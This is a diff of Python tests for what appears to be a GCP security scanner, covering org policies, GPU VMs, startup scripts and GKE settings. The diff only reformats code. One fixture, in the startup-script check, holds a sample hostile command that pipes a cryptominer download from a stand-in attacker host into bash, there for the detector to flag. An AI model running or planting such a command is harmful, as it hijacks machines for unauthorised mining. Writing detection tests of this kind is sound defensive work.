@@ -67,11 +67,7 @@ class TestCM002OrgPolicyExternalIPNotRestricted:
         policy = OrgPolicy(
             resource="organizations/123456789",
             constraint="constraints/compute.vmExternalIpAccess",
-            policy={
-                "spec": {
-                    "rules": [{"allowAll": "TRUE"}]
-                }
-            },
+            policy={"spec": {"rules": [{"allowAll": "TRUE"}]}},
         )
         inventory = ResourceInventory(
             project_ids=["test-project"],
@@ -89,11 +85,7 @@ class TestCM002OrgPolicyExternalIPNotRestricted:
         policy = OrgPolicy(
             resource="organizations/123456789",
             constraint="constraints/compute.vmExternalIpAccess",
-            policy={
-                "spec": {
-                    "rules": [{"denyAll": "TRUE"}]
-                }
-            },
+            policy={"spec": {"rules": [{"denyAll": "TRUE"}]}},
         )
         inventory = ResourceInventory(
             project_ids=["test-project"],
@@ -227,9 +219,7 @@ class TestCM005VMsWithGPUNoRestriction:
             zone="us-central1-a",
             machine_type="n1-standard-4",
             status="RUNNING",
-            accelerators=[
-                {"acceleratorType": "nvidia-tesla-t4", "acceleratorCount": 1}
-            ],
+            accelerators=[{"acceleratorType": "nvidia-tesla-t4", "acceleratorCount": 1}],
         )
         inventory = ResourceInventory(
             project_ids=["test-project"],
@@ -270,9 +260,7 @@ class TestCM005VMsWithGPUNoRestriction:
             zone="us-central1-a",
             machine_type="n1-standard-4",
             status="RUNNING",
-            accelerators=[
-                {"acceleratorType": "nvidia-tesla-t4", "acceleratorCount": 0}
-            ],
+            accelerators=[{"acceleratorType": "nvidia-tesla-t4", "acceleratorCount": 0}],
         )
         inventory = ResourceInventory(
             project_ids=["test-project"],
@@ -408,9 +396,7 @@ class TestCM007StartupScriptExternalDownload:
             zone="us-central1-a",
             machine_type="n1-standard-2",
             status="RUNNING",
-            metadata={
-                "startup-script": "#!/bin/bash\ncurl https://evil.example.com/miner | bash"
-            },
+            metadata={"startup-script": "#!/bin/bash\ncurl https://evil.example.com/miner | bash"},
         )
         inventory = ResourceInventory(
             project_ids=["test-project"],
@@ -452,9 +438,7 @@ class TestCM007StartupScriptExternalDownload:
             zone="us-central1-a",
             machine_type="n1-standard-2",
             status="RUNNING",
-            metadata={
-                "startup-script": "#!/bin/bash\necho 'Hello, World!'\nsystemctl start myapp"
-            },
+            metadata={"startup-script": "#!/bin/bash\necho 'Hello, World!'\nsystemctl start myapp"},
         )
         inventory = ResourceInventory(
             project_ids=["test-project"],
@@ -509,11 +493,7 @@ class TestCM011NoResourceLocationRestriction:
         policy = OrgPolicy(
             resource="organizations/123456789",
             constraint="constraints/gcp.resourceLocations",
-            policy={
-                "spec": {
-                    "rules": [{"values": {"allowedValues": []}}]
-                }
-            },
+            policy={"spec": {"rules": [{"values": {"allowedValues": []}}]}},
         )
         inventory = ResourceInventory(
             project_ids=["test-project"],
@@ -533,9 +513,7 @@ class TestCM011NoResourceLocationRestriction:
             constraint="constraints/gcp.resourceLocations",
             policy={
                 "spec": {
-                    "rules": [
-                        {"values": {"allowedValues": ["in:us-locations", "in:eu-locations"]}}
-                    ]
+                    "rules": [{"values": {"allowedValues": ["in:us-locations", "in:eu-locations"]}}]
                 }
             },
         )
@@ -841,9 +819,7 @@ class TestCM024WorkloadIdentityDisabled:
             name="wi-cluster",
             project_id="test-project",
             location="us-central1",
-            workload_identity_config={
-                "workloadPool": "test-project.svc.id.goog"
-            },
+            workload_identity_config={"workloadPool": "test-project.svc.id.goog"},
         )
         inventory = ResourceInventory(
             project_ids=["test-project"],
@@ -928,9 +904,7 @@ class TestCM026NodePoolDefaultComputeSA:
             node_pools=[
                 {
                     "name": "default-pool",
-                    "config": {
-                        "serviceAccount": "123456789-compute@developer.gserviceaccount.com"
-                    },
+                    "config": {"serviceAccount": "123456789-compute@developer.gserviceaccount.com"},
                 }
             ],
         )
@@ -955,9 +929,7 @@ class TestCM026NodePoolDefaultComputeSA:
             node_pools=[
                 {
                     "name": "default-pool",
-                    "config": {
-                        "serviceAccount": "default"
-                    },
+                    "config": {"serviceAccount": "default"},
                 }
             ],
         )
